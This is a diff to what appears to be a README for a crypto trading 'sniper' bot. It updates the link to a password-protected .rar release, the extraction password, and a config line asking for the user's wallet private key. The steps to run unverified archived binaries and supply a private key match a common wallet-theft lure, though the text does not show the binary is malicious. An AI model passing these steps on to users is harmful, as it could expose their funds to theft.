@@ -118,8 +118,8 @@ The bot currently supports any token using the Uniswap interface.
 
 Full installation guide here: [Alchemism Installation](https://alchemism.io/docs/getting-started/installation.html)
 
-1. [Download](https://github.com/AlchemismCrypto/crypto-sniper-bot/releases/download/Release/AlchemismLite-2.0.3.rar) latest release of AlchemismLite.
-2. Extract the binary files using password `release203`(actual password provided in the ReleaseNotes.txt file).
+1. [Download](https://github.com/AlchemismCrypto/crypto-sniper-bot/releases/download/Release/AlchemismLite-3.0.0.rar) latest release of AlchemismLite.
+2. Extract the binary files using password `release300`(actual password provided in the ReleaseNotes.txt file).
 3. Run the program and enter the AlchemismLite invitation code. For the public version, invitation codes are similar to licenses.
 4. After activation the program is ready for configuration.
 
@@ -127,7 +127,7 @@ Full installation guide here: [Alchemism Installation](https://alchemism.io/docs
 
 ```ini
 [WALLET]
-; This is your BSC wallet's private key.
+; This is your ETH wallet's private key.
 SECRET_KEY=private_wallet_key
 
 ; A private node is recommended for better uptime. However, you may also use free nodes.
